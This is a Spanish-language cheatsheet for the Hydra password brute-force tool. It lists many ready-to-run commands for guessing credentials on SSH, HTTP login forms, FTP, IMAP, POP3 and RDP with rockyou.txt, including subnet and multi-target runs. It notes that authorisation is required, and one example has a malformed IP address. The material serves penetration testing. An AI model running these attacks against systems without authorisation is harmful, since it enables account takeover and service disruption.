# Hydra Cheatsheet Profesional

## Descripción

**Hydra** es una herramienta extremadamente rápida y flexible para realizar ataques de fuerza bruta a diversos servicios de red. Permite atacar una variedad de protocolos y servicios como FTP, SSH, HTTP, IMAP, entre otros, utilizando listas de usuarios y contraseñas.

## Uso Básico

La estructura básica de un comando de **Hydra** es:

```bash
hydra [opciones] [servicio]://[host]
```

El archivo `rockyou.txt` es una de las listas de contraseñas más conocidas y utilizadas en pruebas de penetración, especialmente en ataques de fuerza bruta. Si deseas usar **Hydra** con esta lista de contraseñas, simplemente reemplaza la referencia en los comandos. Aquí tienes los comandos ajustados:

### 1. **Atacar el puerto 22 (SSH)**

```bash
hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt ssh://pagina.ejemplo.com:22 -o resultados_ssh.txt
```

### 2. **Atacar el puerto 80 (HTTP)**

Para servicios HTTP, como un formulario de inicio de sesión:

```bash
hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt http-get://pagina.ejemplo.com -o resultados_http.txt
```

### 3. **Atacar el puerto 443 (HTTPS)**

Para el puerto HTTPS:

```bash
hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt https-get://pagina.ejemplo.com -o resultados_https.txt
```

### 4. **Resumen de los comandos**

Aquí está el resumen completo para atacar los tres puertos utilizando `rockyou.txt`:

```bash
# Para SSH (puerto 22)
hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt ssh://pagina.ejemplo.com:22 -o resultados_ssh.txt

# Para HTTP (puerto 80)
hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt http-get://pagina.ejemplo.com -o resultados_http.txt

# Para HTTPS (puerto 443)
hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt https-get://pagina.ejemplo.com -o resultados_https.txt
```

### Notas importantes:

- **Asegúrate de tener permiso**: Al realizar pruebas de penetración, siempre debes tener la autorización adecuada. Realizar pruebas en sistemas sin permiso es ilegal.
- **Rendimiento**: Usar `rockyou.txt` puede resultar en un ataque que tome más tiempo debido a la longitud de la lista, especialmente si hay muchas combinaciones.
- **Optimización**: Considera usar opciones adicionales en Hydra para mejorar el rendimiento, como `-t` para establecer el número de tareas concurrentes.

## Opciones Comunes

| Opción        | Descripción                                             
|---------------|---------------------------------------------------------------------|
| `-l`          | Define un solo nombre de usuario.                                   |
| `-L`          | Usa una lista de nombres de usuarios.                               |
| `-p`          | Define una sola contraseña.                                         |
| `-P`          | Usa una lista de contraseñas.                                       |
| `-M`          | Especifica una lista de múltiples objetivos.                        |
| `-s`          | Especifica un puerto personalizado.                                 |
| `-t`          | Define el número de hilos (máximo de conexiones paralelas).         |
| `-o`          | Especifica el nombre del archivo donde se guardarán los resultados. |
| `-f`          | Detenerse cuando se encuentre la primera contraseña válida.         |
| `-6`          | Habilitar ataques sobre IPv6.                                       |
| `-C`          | Especifica un archivo con combinaciones `usuario:contraseña`.       |

## Protocolos Soportados

**Hydra** puede atacar una variedad de servicios como:

- `ftp`
- `ssh`
- `telnet`
- `smtp`
- `http-get` / `http-post`
- `imap`
- `pop3`
- `smb`
- `vnc`
- `ldap`
- `rdp`
- `mssql`
- `mysql`
- `postgres`
- `snmp`
- `redis`
- `sip`
- Y muchos más.

## Ejemplos Comunes

### 1. **Ataque FTP con un usuario y lista de contraseñas**

```bash
hydra -l user -P passlist.txt ftp://192.168.0.1 -o resultados_ftp.txt
```

### 2. **Ataque IMAP con lista de usuarios y contraseña predeterminada**

```bash
hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN -o resultados_imap.txt
```

### 3. **Ataque POP3 seguro con archivo de combinaciones de usuario:contraseña y soporte IPv6**

```bash
hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5 -o resultados_pop3.txt
```

### 4. **Escaneo de subred para FTP con un usuario y contraseña específicos**

```bash
hydra -l admin -p password ftp://[192.168.0.0/24]/ -o resultados_subred.txt
```

### 5. **Ataque SSH contra múltiples objetivos con listas de usuarios y contraseñas**

```bash
hydra -L logins.txt -P pws.txt -M targets.txt ssh -o resultados_ssh.txt
```

### 6. **Ataque HTTP POST con lista de usuarios y contraseñas**

```bash
hydra -L users.txt -P pass.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" -t 64 -v -o resultados_http.txt
```

### 7. **Ataque HTTP GET a una página protegida con autenticación básica**

```bash
hydra -L users.txt -P pass.txt http-get://example.com/protected -o resultados_http_get.txt
```

### 8. **Fuerza bruta RDP (Escritorio Remoto)**

```bash
hydra -t 1 -V -f -L users.txt -P passlist.txt rdp://192.168.1.100 -o resultados_rdp.txt
```

### 9. **Atacando múltiples servicios a la vez**

```bash
hydra -L users.txt -P passlist.txt ftp://192.168.1.10 ssh://192.168.1.11 rdp://192.168.1.12 -o resultados_multi.txt
```

### 10. **Ataque SSH con rockyou.txt**

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 1010.137.76 ssh -o resultados_rockyou.txt
```

## Consejos Adicionales

- **Hilos y rendimiento:** Ajusta el número de hilos con `-t`. Un valor demasiado alto puede resultar en bloqueos o en la denegación del servicio en el servidor.
  
- **Detener en el primer éxito:** Usa `-f` para que Hydra se detenga después de encontrar una combinación válida de usuario y contraseña.

- **Guardar resultados:** Utiliza `-o resultado.txt` para guardar los resultados exitosos en un archivo de texto.

## Fuentes de Documentación

Para más información sobre opciones y ejemplos específicos, consulta la documentación oficial o utiliza el comando:

```bash
hydra -h
```
